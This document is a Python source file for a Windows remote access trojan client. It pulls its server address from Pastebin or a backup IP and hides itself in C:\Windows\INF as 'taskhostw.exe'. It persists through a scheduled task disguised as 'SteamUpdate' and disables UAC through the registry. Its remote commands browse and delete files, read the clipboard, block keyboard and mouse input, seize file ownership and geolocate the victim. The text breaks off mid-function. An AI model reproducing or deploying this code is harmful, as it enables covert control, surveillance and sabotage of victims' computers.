# client.py
import importlib.util
import types
import inspect
import zipfile
import io
import random
import string
import site

import socket
import json
import keyboard
import os
import sys
import platform
import requests
import win32gui
import win32con
import mss
import ctypes
import pyautogui
import time
import pyaudio   
import pygame
import pyperclip   
import numpy as np  
import sounddevice as sd
import wave
import tempfile
import subprocess
import winreg as reg
import uuid
import shutil
import logging
import threading
import psutil
import cv2
import struct
import win32ui
import win32api
from PIL import Image


# Setting up logging
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s', handlers=[logging.StreamHandler()])
logger = logging.getLogger(__name__)
    
    
# ====== Auto-detection CLIENT_ID ======
def get_hwid():
    #1. Try via WMIC (motherboard UUID)
    try:
        cmd = 'wmic csproduct get uuid'
        try:
            oem_cp = f"cp{ctypes.windll.kernel32.GetOEMCP()}"
        except Exception:
            oem_cp = 'cp866'
        output = subprocess.check_output(cmd, shell=True).decode(oem_cp, errors='ignore').strip()
        lines = output.split('\n')
        hwid = lines[1].strip() if len(lines) > 1 else None
        if hwid and hwid != 'UUID':
            return hwid
    except Exception as e:
        logger.error(f"Error retrieving HWID (WMIC): {e}")

    # 2. Trying through the Registry (MachineGuid) -The most reliable fallback
    # Works even if WMI is broken. ID does not change until Windows is reinstalled.
    try:
        key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography", 0, reg.KEY_READ | reg.KEY_WOW64_64KEY)
        guid, _ = reg.QueryValueEx(key, "MachineGuid")
        reg.CloseKey(key)
        if guid:
            return guid
    except Exception as e:
       logger.error(f"Error retrieving HWID (Registry): {e}")

    #3. Last Chance: MAC Address
    # uuid.getnode() gets the network card address. He is static.
    try:
        mac_num = uuid.getnode()
        return f"mac-{mac_num}"
    except Exception:
        pass
        
    # 4. If everything is really bad (extreme case), take the username
    return f"user-{os.getenv('USERNAME', 'unknown')}"

device_name = os.getenv("COMPUTERNAME", "UnknownDevice")
CLIENT_ID = f"{device_name}/{get_hwid()}"
logger.info(f"CLIENT_ID: {CLIENT_ID}")

pyautogui.FAILSAFE = False

EXEC_URL = "https://pastebin.com/raw/xxxx" # Insert your link here
DEFAULT_IP = "111.11.11.111" # Specify your backup IP here
DEFAULT_PORT = 7777 # Specify your backup port here

def get_buffer_process():
    """
    Downloads the server configuration from Pastebin.
    On failure, returns backup data instead of exiting.
    """
    for attempt in range(5):
        try:
            logger.info(f"Attempting {attempt + 1}/5 to get configuration from Pastebin...")
            response = requests.get(EXEC_URL, timeout=10)
            response.raise_for_status()
            data = response.json()

            ip = data.get("ip", "").strip()
            port = data.get("port")

           # Data verification
            if not ip or not isinstance(port, int) or port < 1 or port > 65535:
                raise ValueError("Incorrect JSON data")

            logger.info(f"Successfully received configuration from network: {ip}:{port}")
            return ip, port

        except (requests.RequestException, json.JSONDecodeError, ValueError, Exception) as e:
            logger.error(f"Error trying {attempt + 1}: {e}")

        if attempt < 4:
            time.sleep(3)

    # IMPORTANT FIX: Instead of sys.exit(1) we return default
    logger.warning("---WARNING ---")
    logger.warning(f"Failed to receive data from the network. I am using a backup server: {DEFAULT_IP}:{DEFAULT_PORT}")
    
    return DEFAULT_IP, DEFAULT_PORT

# Now variables will always get values
SERVER_IP, SERVER_PORT = get_buffer_process()
RECONNECT_DELAY = 15

# ====== Global variables ======

# ---Version and restrictions ---
CURRENT_VERSION = 39
MAX_LEN = 4000

# ---Paths ---
TARGET_DIR = r"C:\Windows\INF"
current_path = os.path.expanduser("~")
DISABLED_PLUGINS_FILE = os.path.join(
    os.getenv('APPDATA', current_path),
    'SystemData',
    'plugins_config.json'
)

# ---Imma /pameter ---
new_name = "taskhostw.exe"
HB_INTERVAL = 5  # Heart beating

# ---Network status ---
current_socket = None
socket_lock = threading.Lock()
send_lock = threading.Lock()

# ---Threads and IDs ---
current_thread_id = None
auto_thread = None
video_thread = None
music_thread = None
mouse_mess_thread = None

# ---Events ---
stop_event = threading.Event()
video_stop_event = threading.Event()
music_stop_event = threading.Event()
mouse_mess_stop_event = threading.Event()
hb_stop_event = threading.Event()

#---File synchronization ---
file_lock = threading.Lock()

# ---Audio ---
_mixer_initialized = False

# ---Registers ---
COMMANDS_REGISTRY = {}
MODULES_METADATA = {}


# ====== Helper functions ======
def is_good_window(hwnd):
    if not win32gui.IsWindowVisible(hwnd):
        return False

    title = win32gui.GetWindowText(hwnd).strip()
    if not title:
        return False

    class_name = win32gui.GetClassName(hwnd)

    blacklist_classes = {
        "Progman",       # Program Manager
        "WorkerW",       # Background container
        "ime",           # Default IME
        "MSCTFIME UI",   # Text services
    }

    if class_name in blacklist_classes:
        return False

    return True


def enum_windows_callback(hwnd, windows_list):
    if is_good_window(hwnd):
        title = win32gui.GetWindowText(hwnd)
        windows_list.append((hwnd, title))


def force_focus_window(hwnd):
    user32 = ctypes.windll.user32

    # Allow the window to be moved to foreground
    try:
        user32.AllowSetForegroundWindow(ctypes.c_uint(-1))
    except:
        pass

   #1) Trying to show a window
    win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
    win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)

    #2) Attempting normal activation
    try:
        win32gui.SetForegroundWindow(hwnd)
        return True
    except:
        pass

    # 3) Alt -unlocks foreground-lock
    try:
        pyautogui.press('alt')
        win32gui.SetForegroundWindow(hwnd)
        return True
    except:
        pass

   #4) Hard fallback
    try:
        user32.SwitchToThisWindow(hwnd, True)
        return True
    except:
        return False


def enable_aggressive_keepalive(sock):
    """
    Enables aggressive TCP Keepalive for Windows.
    The check starts after 5 seconds of inactivity and is repeated every 3 seconds.
    if there is no answer -break after ~15 seconds.
    """
    try:
        # Enable Keepalive
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

        # Windows-specific: (on/off, time_ms, interval_ms)
        #1 = On
        # 5000 = send a keepalive packet if there is silence for 5 seconds
        #3000 = if no response, resend every 3 seconds
        sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 5000, 3000))
        logger.info("Aggressive Keepalive enabled.")
    except Exception as e:
        logger.error(f"Failed to enable Keepalive: {e}")

def XOR_cipher(data: bytes, key="STORMZOV") -> bytes:
    """XOR encryption to mask code on disk"""
    key_bytes = key.encode()
    return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])


def get_random_name():
    """Generating a random file name for obfuscation on disk"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + ".dat"


def get_disabled_list():
    """Getting a list of disabled plugins from the config"""
    try:
        if os.path.exists(DISABLED_PLUGINS_FILE):
            with open(DISABLED_PLUGINS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
    except: pass
    return []


def save_disabled_list(disabled_list):
    """Saving plugin state"""
    try:
        if not os.path.exists(os.path.dirname(DISABLED_PLUGINS_FILE)):
            os.makedirs(os.path.dirname(DISABLED_PLUGINS_FILE))
        with open(DISABLED_PLUGINS_FILE, 'w', encoding='utf-8') as f:
            json.dump(disabled_list, f)
    except: pass


############################

def kill_parent_stub():
    try:
        current_process = psutil.Process(os.getpid())
        parent_process = current_process.parent()

        if parent_process is not None:
            parent_name = parent_process.name().lower()
            logger.debug(f"[INFO] Terminating the parent process: PID={parent_process.pid}, Name={parent_name}")
            parent_process.terminate()
            parent_process.wait(timeout=5)
        else:
            logger.debug("[INFO] Parent process not found")
    except Exception as e:
        logger.debug(f"[ERROR] Failed to terminate parent process: {e}")


def disable_uac():
    """
    Disables UAC and notifications in silent mode
    """
    try:
        logger.info("Start of shutdown UAC...")

        # Disable UAC through the registry
        with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, 
                       r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 
                       0, reg.KEY_SET_VALUE) as key:
            # EnableLUA = 0 -Disables UAC
            reg.SetValueEx(key, "EnableLUA", 0, reg.REG_DWORD, 0)
            # ConsentPromptBehaviorAdmin = 0 -Disables requests
            reg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, reg.REG_DWORD, 0)
            # PromptOnSecureDesktop = 0 -Disables secure desktop
            reg.SetValueEx(key, "PromptOnSecureDesktop", 0, reg.REG_DWORD, 0)

        #Advanced: Disable security notifications
        with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, 
                       r"SOFTWARE\Microsoft\Security Center", 
                       0, reg.KEY_SET_VALUE) as key:
            reg.SetValueEx(key, "UacDisableNotify", 0, reg.REG_DWORD, 1)

        logger.info("UAC and notifications successfully disabled")
        return True

    except Exception as e:
        logger.error(f"Error disabling UAC: {e}")
        return False


"""
def change_shell():
    logger.info("Shell change started")
    try:
        logger.info("Opening the Winlogon registry key...")
        key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
        logger.info("Key is open")
        value = f"explorer.exe, {TARGET_DIR}\\{new_name}"
        logger.info(f"Set shell value: {value}")
        reg.SetValueEx(key, "shell", 0, reg.REG_SZ, value)
        logger.info("Value 'shell' changed successfully")
        reg.CloseKey(key)
        logger.info("Key closed")
    except Exception as e:
        logger.error(f"Error changing shell: {e}")
    finally:
        logger.info("Shell change thread completed")
"""

def change_shell():
    logger.info("Setting up hidden autorun via Scheduler...")
    try:
        app_path = os.path.join(TARGET_DIR, new_name)
        task_name = "SteamUpdate" #Looks legit
        
        # 1. First, delete the old task, if there was one, so as not to create duplicates
        subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True, capture_output=True)
        
        # 2. Create a new task
        # /sc onlogon -launch when user logs in
        # /tr -path to the file
        # /rl highest -run with the highest rights (if possible)
        # /it -interactive launch
        # /f -force creation
        cmd = (
            f'schtasks /create /tn "{task_name}" /tr "\'{app_path}\'" '
            f'/sc onlogon /rl highest /f'
        )
        
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            logger.info("The program is successfully hidden in the Task Scheduler")
        else:
            # If it was not possible to create with highest rights, create a normal one
            cmd_basic = f'schtasks /create /tn "{task_name}" /tr "\'{app_path}\'" /sc onlogon /f'
            subprocess.run(cmd_basic, shell=True)
            logger.info("A regular task has been created in Scheduler")

    except Exception as e:
        logger.error(f"Hidden autorun error: {e}")


def set_file_attributes(file_path):
   # Set the hidden and system attributes
    ctypes.windll.kernel32.SetFileAttributesW(file_path, 0x02 | 0x04)
    

def copy_to_target():
    """
    Copies the current executable file to the target directory, 
    sets attributes, starts a copy, and terminates the current instance.
    """
    try:
        if not os.path.exists(TARGET_DIR):
            os.makedirs(TARGET_DIR)
            logger.info(f"The {TARGET_DIR} folder has been created.")

        current_file = sys.argv[0]
        target_file = os.path.join(TARGET_DIR, new_name)

        # Checking if we are already working from the target folder
        if os.path.abspath(current_file).lower() == os.path.abspath(target_file).lower():
            logger.info("Already working from the target folder.")
            return True

        # If the file is not in the target folder, copy it
        if not os.path.exists(target_file):
            logger.info(f"Copying {current_file} to {target_file}...")
            shutil.copy2(current_file, target_file) 
            logger.info(f"The program was successfully copied to {target_file}.")
            
            # Set attributes immediately after copying
            set_file_attributes(target_file)
        else:
            logger.info(f"The file already exists in {target_file}, no copying required.")

        # Run copied file
        logger.info("Launch file from target folder...")
        os.startfile(target_file)
        
        # Terminate the current instance
        logger.info("Started a file from the target folder. Terminating the current instance.")
        change_shell()
        os._exit(0)

    except PermissionError as pe:
        logger.critical(f"Permissions error when copying/creating folder/running: {pe}")
        return False
    except Exception as e:
        logger.error(f"Unexpected error while copying or running: {e}")
        return False


def delete_mei():
    temp_dir = tempfile.gettempdir()
    current_meipass = getattr(sys, "_MEIPASS", "")

    print(f"[DEBUG] TEMP DIR: {temp_dir}")
    print(f"[DEBUG] CURRENT _MEIPASS: {current_meipass}")

    for name in os.listdir(temp_dir):
        full_path = os.path.join(temp_dir, name)
        if name.startswith("_MEI") and os.path.isdir(full_path):
            print(f"[DEBUG] Folder found: {full_path}")
            if os.path.abspath(full_path) == os.path.abspath(current_meipass):
                print(f"[SKIP] Skipping current _MEIPASS: {full_path}")
                continue
            try:
                shutil.rmtree(full_path, ignore_errors=False)
                print(f"[OK] Removed: {full_path}")
            except Exception as e:
                print(f"[ERROR] Failed to delete {full_path}: {e}")


#############################################################
# ====== File manager ======

def cmd_ls(args):
    """
    Returns a Markdown list: path with separate inline code, 
    each file/folder is also a separate inline code.
    For long output -a file without formatting.
    """
    global current_path, MAX_LEN

    target_path = current_path

    #1. Root: drives
    if current_path == '/':
        drives = []

        for i in range(ord('A'), ord('Z') + 1):
            drive = chr(i) + ":\\"
            if os.path.exists(drive):
                if psutil:
                    size = psutil.disk_usage(drive).total // (1024**3)
                    drives.append(f"💾 `{drive}` — {size} GB")
                else:
                    drives.append(f"💾 `{drive}`")

        if not drives:
            return "❌ No disks found."

        text = "📂 `/`\n\n" + "\n".join(drives)

        if len(text) <= MAX_LEN:
            return text

       # if too long → file
        with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix="_drives.txt", encoding="utf-8") as tmp:
            tmp.write("\n".join([d.replace("`", "") for d in drives]))
            return tmp.name

    #2. Transition processing
    if args.strip():
        arg = args.strip()
        if os.path.isabs(arg) and os.path.isdir(arg):
            target_path = arg
            current_path = arg
        else:
            cand = os.path.join(current_path, arg)
            if os.path.isdir(cand):
                target_path = cand
                current_path = cand
            else:
                return f"❌ Folder '{arg}' does not exist."

  #3. Read the folder
    try:
        items = os.listdir(target_path)
    except Exception as e:
        return f"❌ Access error: {e}"

    dirs = []
    files = []

    for item in sorted(items, key=str.lower):
        full = os.path.join(target_path, item)
        if os.path.isdir(full):
            dirs.append(item)
        else:
            files.append(item)

   #4. Forming Markdown without blocks
    path_line = f"📂 `{target_path}`\n\n"
    lines = []

    for d in dirs:
        lines.append(f"📁 `{d}`")
    for f in files:
        lines.append(f"📄 `{f}`")

    out = path_line + "\n".join(lines)

    if len(out) <= MAX_LEN:
        return out # regular Markdown message

    # 5. If it’s long, send it as a file WITHOUT Markdown
    plain = target_path + "\n\n" + "\n".join(dirs + files)

    with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix="_ls.txt", encoding="utf-8") as tmp:
        tmp.write(plain)
        temp_path = tmp.name

    with socket_lock:
        conn = current_socket

    send_response(conn, None, cmd_name="/ls", is_file=True, file_path=temp_path)

    return None


def cmd_cd(args):
    global current_path
    logger.debug(f"Executes /cd with arguments: {args}")
    try:
        with file_lock:
            path = os.path.normpath(os.path.join(current_path, args.strip()))
            if os.path.isdir(path):
                current_path = path
                return f"✅ Current path: {current_path}"
            return "❌ Folder does not exist or is not a folder"
    except Exception as e:
        return f"❌ Error: {str(e)}"


def cmd_back(args):
    """
    Goes to the parent folder. From the root directory of the drive (C:\) 
    translates to virtual root (/) to view drives.
    """
    global current_path
    #1. If we are already in the virtual root, return an error
    if current_path == '/':
        return "❌ You are in the root folder (disc browsing)"

    # 2. Checking if we are at the ROOT of the drive (for example, "C:\")
    # 🔥 FIXED: Condition should be len(current_path) == 3, not >= 3
    if len(current_path) == 3 and current_path[1:3] == ':\\':
        # If we are in C:\, go to the virtual root /
        current_path = '/'
        return f"✅ Current path: Browse drives ({current_path})"

    # 3. Standard transition to the parent directory
    parent_path = os.path.dirname(current_path)

    if parent_path:
        # Make sure the path has a trailing slash if it is the root of the drive (C:\)
        # os.path.dirname('C:\\User') -> 'C:\\'
        # os.path.dirname('C:\\') -> 'C:' 
        if len(parent_path) == 2 and parent_path.endswith(':'): # If os.path.dirname returned "C:"
            parent_path += '\\'
            
        current_path = parent_path
        
    return f"✅ Current path: {current_path}"


def cmd_pwd(args):
    logger.debug(f"Executes /pwd with arguments: {args}")
    return current_path


def cmd_mkdir(args):
    logger.debug(f"Executes /mkdir with arguments: {args}")
    try:
        with file_lock:
            path = os.path.join(current_path, args.strip())
            os.makedirs(path, exist_ok=True)
            return f"✅ Folder '{args.strip()}' created"
    except Exception as e:
        return f"❌ Error: {str(e)}"


def cmd_delete(args, conn):
    """
    Deletes files/folders in the background. 
    Includes size counting, object counting, and error handling.
    """
    
    # ---1. Nested format function ---
    def format_bytes(size):
        power = 2**10
        n = 0
        labels = {0: 'B', 1: 'KB', 2: 'MB', 3: 'GB', 4: 'TB'}
        while size > power and n < 4:
            size /= power
            n += 1
        return f"{size:.2f} {labels[n]}"

    # ---2. Nested worker for thread ---
    def delete_worker(target, connection, original_arg):
        deleted_size = 0
        deleted_count = 0
        errors_count = 0
        
        try:
            if os.path.isfile(target):
                try:
                    f_size = os.path.getsize(target)
                    os.remove(target)
                    deleted_size += f_size
                    deleted_count += 1
                except:
                    errors_count += 1

            elif os.path.isdir(target):
                for root, dirs, files in os.walk(target, topdown=False):
                    for name in files:
                        file_path = os.path.join(root, name)
                        try:
                            try: f_size = os.path.getsize(file_path)
                            except: f_size = 0
                            os.remove(file_path)
                            deleted_size += f_size
                            deleted_count += 1
                        except:
                            errors_count += 1
                    
                    for name in dirs:
                        try:
                            os.rmdir(os.path.join(root, name))
                        except:
                            errors_count += 1
                
                # Delete the empty folder shell itself
                try:
                    os.rmdir(target)
                except:
                    errors_count += 1

            # Generating the final report
            status_emoji = "✅" if errors_count == 0 else "⚠️"
            report = (
                f"🗑 *Deletion report*\n"
                f"━━━━━━━━━━━━━━━\n"
                f"📍 Object: `{original_arg}`\n"
                f"📦 Cleared: *{format_bytes(deleted_size)}*\n"
                f"📄 Deleted: `{deleted_count}` objects\n"
                f"{status_emoji} Errors: `{errors_count}` pcs."
            )
            
            send_response(connection, report, cmd_name="/delete")

        except Exception as e:
            send_response(connection, f"❌ Error in deletion thread: {e}", cmd_name="/delete")

    # ---3. Basic login logic ---
    path_arg = args.strip()
    if not path_arg:
        return "⚠️ No path specified. Example: `/delete logs`"

    # Concatenate the path with the current directory of the bot
    target_full_path = os.path.abspath(os.path.join(current_path, path_arg))

    if not os.path.exists(target_full_path):
        return f"❌ Object not found: `{path_arg}`"

    # We start execution in a separate thread so that the client does not hang
    threading.Thread(
        target=delete_worker, 
        args=(target_full_path, conn, path_arg), 
        daemon=True
    ).start()

    return f"⏳ I'm starting to delete `{path_arg}`... The result will come as a message."


def cmd_rename(args):
    logger.debug(f"Executes /rename with arguments: {args}")
    try:
        with file_lock:
            parts = args.split('/n', 1)
            if len(parts) < 2:
                return "❌ Format: /rename old/nnew"
            old, new = parts[0].strip(), parts[1].strip()
            old_path = os.path.join(current_path, old)
            new_path = os.path.join(current_path, new)
            os.rename(old_path, new_path)
            return f"✅ Renaissed in '{new}'"
    except Exception as e:
        return f"❌ Error: {str(e)}"


def cmd_copy(args):
    logger.debug(f"Executes /copy with arguments: {args}")
    try:
        with file_lock:
            parts = args.split('/to', 1)
            if len(parts) < 2:
                return "❌ Format: /copy src/to dst"
            src, dst = parts[0].strip(), parts[1].strip()
            src_path = os.path.join(current_path, src)
            dst_path = os.path.join(current_path, dst)
            if os.path.isdir(src_path):
                shutil.copytree(src_path, dst_path, dirs_exist_ok=True)
            else:
                shutil.copy2(src_path, dst_path)
            return f"✅ Copied to '{dst}'"
    except Exception as e:
        return f"❌ Error: {str(e)}"


def cmd_move(args):
    logger.debug(f"Execute /move with arguments: {args}")
    try:
        with file_lock:
            parts = args.split('/to', 1)
            if len(parts) < 2:
                return "❌ Format: /move src/to dst"
            src, dst = parts[0].strip(), parts[1].strip()
            src_path = os.path.join(current_path, src)
            dst_path = os.path.join(current_path, dst)
            shutil.move(src_path, dst_path)
            return f"✅ Moved to '{dst}'"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# ====== Other commands ======
def cmd_msg(args):
    try:
        parts = args.split('/t', 1)
        if len(parts) < 2:
            return "Format: /msg [type] [title]/t<text>"
        
        header = parts[0].strip().split()
        text = parts[1].strip()
        
        # Icon types
        types = {
            "info":     0x40,  # ℹ️
            "warning":  0x30,  # Warning
            "error":    0x10,  # Error
            "question": 0x20   # Question
        }
        msg_type = header[0].lower() if header else "info"
        icon = types.get(msg_type, 0x40)
        
        # Header
        title = " ".join(header[1:]) if len(header) > 1 else "Message"

        # Hidden window + MessageBox
        def show_msgbox():
            user32 = ctypes.windll.user32
            hwnd = user32.CreateWindowExW(0, "STATIC", "", 0, 0, 0, 0, 0, 0, 0, 0, 0)
            user32.MessageBoxW(hwnd, text, title, icon | 0x1000)  # MB_SYSTEMMODAL
            user32.DestroyWindow(hwnd)

        threading.Thread(target=show_msgbox, daemon=True).start()
        return "✅ Done"
    
    except Exception as e:
        return f"❌ Error: {e}"


def cmd_grant(args):
    """
    /grant <path>
    Multi-level unlocking of access in the background with a final report.
    Locale dependence is eliminated (SIDs are used).
    """
    if not args:
        return "❌ Specify the path to the file or folder."

    target_path = args.strip().strip('"\'')
    if not os.path.isabs(target_path):
        target_path = os.path.join(current_path, target_path)
    target_path = os.path.abspath(target_path)

    if not os.path.exists(target_path):
        return f"❌Object not found: {target_path}"

    def heavy_lifting(path, sock_to_use):
        report = [f"🏁 Access summary: `{os.path.basename(path)}`"]

        try:
            # 1. Removing attributes (no locale dependence)
            subprocess.run(
                f'attrib -r -s -h "{path}" /s /d',
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            report.append("✅ Attributes (Read-only/System/Hidden) have been removed.")

            #2. Taking ownership (SID Administrators)
            res_take = subprocess.run(
                f'takeown /f "{path}" /a /r /d y',
                shell=True,
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            if res_take.returncode == 0:
                report.append("✅ Ownership has been transferred to the Administrators (SID) group.")
            else:
                report.append("⚠️ Takeown completed with comments.")

            # 3. Issuance of rights through icacls (SID ONLY)
            sids = {
                "Administrators": "S-1-5-32-544",
                "Everyone": "S-1-1-0",
            }

            granted = []
            for name, sid in sids.items():
                cmd = f'icacls "{path}" /grant *{sid}:F /t /c /q'
                res = subprocess.run(
                    cmd,
                    shell=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                if res.returncode == 0:
                    granted.append(name)

            if granted:
                report.append(f"✅ Full Control Issued: {', '.join(granted)}.")
            else:
                report.append("⚠️ icacls did not report successful changes.")

           # 4. PowerShell (control, via SID Everyone)
            ps_cmd = (
                f"$path = '{path}'; "
                "$sid = New-Object System.Security.Principal.SecurityIdentifier('S-1-1-0'); "
                "$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("
                "$sid, 'FullControl', 'ContainerInherit,ObjectInherit', 'None', 'Allow'); "
                "$acl = Get-Acl $path; "
                "$acl.SetAccessRule($rule); "
                "Set-Acl $path $acl"
            )

            subprocess.run(
                ["powershell", "-NoProfile", "-Command", ps_cmd],
                creationflags=subprocess.CREATE_NO_WINDOW
            )

            report.append("✅ PowerShell ACL correction completed.")

            final_msg = "\n".join(report)

        except Exception as e:
            final_msg = f"❌ Error executing /grant for {path}: {str(e)}"

        # Send result
        try:
            if sock_to_use:
                send_response(sock_to_use, final_msg)
        except Exception:
            pass

    # Start a background thread
    thread = threading.Thread(
        target=heavy_lifting,
        args=(target_path, current_socket),
        daemon=True
    )
    thread.start()

    return f"⏳ Seizing rights for `{os.path.basename(target_path)}`...\nThis will take some time."


def cmd_version(args):
    """Returns the client version"""
    return f"Client version: {CURRENT_VERSION}"


def cmd_cmdbomb(args):
    try:
        # Open 10 CMD windows
        os.popen('start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd')
        return '✅ There are 10 CMD windows open.'
    except Exception as e:
        return f'❌ Error: {e}'


def cmd_sysinfo(args):
    logger.debug(f"Executing /sysinfo with arguments: {args}")
    try:
        info = {
            "OS": f"Windows {os.sys.platform}",
            "CPU": f"{psutil.cpu_percent(interval=0.5)}%",
            "RAM": f"{psutil.virtual_memory().percent}%",
            "Disk": f"{psutil.disk_usage(current_path).percent}%"
        }
        return "\n".join(f"{k}: {v}" for k, v in info.items())
    except Exception as e:
        return f"❌ Error: {str(e)}"


def cmd_location(args, conn):
    try:
        #1. External IP
        ip_resp = requests.get("https://api.ipify.org?format=json", timeout=10)
        ip_resp.raise_for_status()
        public_ip = ip_resp.json().get("ip", "Unknown")

        # 2. Geolocation
        geo_resp = requests.get(f"http://ip-api.com/json/{public_ip}", timeout=10)
        geo_resp.raise_for_status()
        data = geo_resp.json()

        if data.get("status") != "success":
            send_response(conn, f"IP: {public_ip}\Geolocation is not available.")
            return

        # 3. Clean text
        lines = [
            f"IP (external): {public_ip}",
            f"IP (local): {socket.gethostbyname(socket.gethostname())}",
            f"Country: {data.get('country', '—')}",
            f"Region: {data.get('regionName', '—')}",
            f"City: {data.get('city', '—')}",
            f"ISP: {data.get('isp', '—')}",
            f"Organization: {data.get('org', '—')}",
            f"Timezone: {data.get('timezone', '—')}",
            f"Coordinates: {data.get('lat')}, {data.get('lon')}",
        ]

        # Remove lines with "—" if necessary
        lines = [line for line in lines if not line.endswith("—")]

        #4. Send
        send_response(conn, "\n".join(lines))

    except Exception as e:
        send_response(conn, f"Error: {e}")


# ====== Working with the clipboard ======
def cmd_changeclipboard(args):
    if not args:
        return "❌ Specify text for clipboard."
    try:
        text = args.strip()
        # Windows: 'echo | set /p nul=text | clip'
        # Use double quotes for safety
        command = f'echo | set /p nul="{text}" | clip' 
        os.system(command)
        return f'✅ Clipboard changed to: \"{text}\"'
    except Exception as e:
        return f'❌ Error: {e}'


def cmd_getclipboard(args):
    """Gets the text content of the clipboard."""
    CF_TEXT = 1
    
    kernel32 = ctypes.windll.kernel32
    user32 = ctypes.windll.user32
    
    # Setting up arguments/return values ​​for C functions
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
    user32.GetClipboardData.restype = ctypes.c_void_p
    
    try:
        if not user32.OpenClipboard(0):
            return "❌ Failed to open clipboard."
        
        result_text = "📋 The clipboard is empty or contains non-text data."
        
        if user32.IsClipboardFormatAvailable(CF_TEXT):
            data = user32.GetClipboardData(CF_TEXT)
            if data:
                data_locked = kernel32.GlobalLock(data)
                text_ptr = ctypes.c_char_p(data_locked)
                value = text_ptr.value # Receive bytes
                kernel32.GlobalUnlock(data_locked)
                
                if value:
                    # Decoding attempts: UTF-8 -> CP1251
                    try:
                        body = value.decode('utf-8', errors='strict')
                    except UnicodeDecodeError:
                        body = value.decode('cp1251', errors='replace')
                    
                    username = os.getlogin()
                    result_text = f"📋 User clipboard '{username}':\n---\n{body}"
        
        return result_text
        
    except Exception as e:
        return f"❌ Error reading clipboard: {e}"
    finally:
        # It is important to always close the clipboard
        try:
            user32.CloseClipboard()
        except Exception:
            pass


# ====== Lock/Unlock input ======
def cmd_block(args):
    """Blocks user input (mouse and keyboard)."""
    try:
        ctypes.windll.user32.BlockInput(True)
        return "✅ Input blocking (mouse/keyboard) activated."
    except Exception as e:
        return f"❌ Error blocking input: {e}"


def cmd_unblock(args):
    """Unblocks user input."""
    try:
        # Remove the lock
        ctypes.windll.user32.BlockInput(False)  
        return "✅Input lock (mouse/keyboard) removed."
    except Exception as e:
        return f"❌Error unlocking input: {e}"


# ====== Process list management ======
def cmd_taskkill(args):
    """
    Kills one or more processes by name or PID (Windows only).
    Accepts a list of names/PIDs separated by spaces.
    Example: /taskkill chrome.exe 1234
    """

    # Safely convert args to string before strip() (prevents error if args=None)
    targets_str = (args if args is not None else "").strip()

    if not targets_str:
        return "❌ Specify the process name (for example, chrome.exe) or PID (the number)."

    targets = targets_str.split()
    results = []

    for target in targets:
        # Check if the target is a PID (number)
        if target.isdigit():
            # Close by PID (/PID)
            command = ['taskkill', '/PID', target, '/F']
            desc = f"PID {target}"
        else:
            # Close by name (/IM -Image Name)
            command = ['taskkill', '/IM', target, '/F']
            desc = f"Process {target}"

        try:
            # Run the taskkill command with forced termination (/F)
            subprocess.run(
                command, 
                check=True, 
                capture_output=True, 
                text=True, 
                encoding='utf-8'
            )
            results.append(f"✅ {desc} successfully terminated.")
            
        except subprocess.CalledProcessError as e:
            # Taskkill issues a non-zero return code if the process is not found or access is denied
            
            # 🔥 FIX: Check e.stderr for None to avoid AttributeError.
            if e.stderr is None:
                # If e.stderr is None, we report an error with a return code.
                error_message = f"Command failed with error code {e.returncode}, but no error message is available."
            else:
                # Get the last line of the error message and clean it
                error_message = e.stderr.strip().split('\n')[-1].strip()
            
            results.append(f"❌ {desc}: {error_message}")
            
        except FileNotFoundError:
            # This can happen if 'taskkill' is not found in PATH (unlikely in Windows)
            results.append(f"❌ {desc}: Command 'taskkill' not found. Ensure you are on Windows.")
            
        except Exception as e:
            results.append(f"❌ {desc}: General Error: {e}")

    return "\n".join(results)


def cmd_tasklist(args):
    """
    Displays a list of running processes, including the path to the executable file,
    and saves the result to a TXT file. (Uses WMIC with parsing fixed)
    """
    if os.name != 'nt':
        return "❌ The Tasklist (WMIC) command is only supported on Windows."
        
    temp_file_path = None
    try:
        # 1. Use WMIC to get the Name, File Path and PID.
        # Output: Node,Caption,ExecutablePath,ProcessId
        command = ['wmic', 'process', 'get', 'Caption,ExecutablePath,ProcessId', '/format:csv']
        
        # Using cp866 for Windows
        result = subprocess.run(command, capture_output=True, text=True, check=True, encoding='cp866', errors='replace')
        
        output_lines = ["TASKLIST (Process name | PID | File path)\n", "="*100 + "\n"]
        
        csv_data = result.stdout.strip().split('\n')
        
        data_found = False

        # We skip the first lines (blank line and headers), starting processing from the third element (index 2)
        for i, line in enumerate(csv_data):
            if i < 2: continue # We skip two lines with metadata

            line = line.strip()
            if not line: continue

            # Divide by comma. We expect 4 parts: Node, Caption, ExecutablePath, ProcessId
            parts = [p.strip() for p in line.split(',')]
            
            # 🔥 FIX: Check that there are 4 elements and PID is a number
            if len(parts) == 4 and parts[3].isdigit(): 
                # parts[1] = Caption (Process name)
                # parts[2] = ExecutablePath
                # parts[3] = ProcessId (PID)
                
                image_name = parts[1]
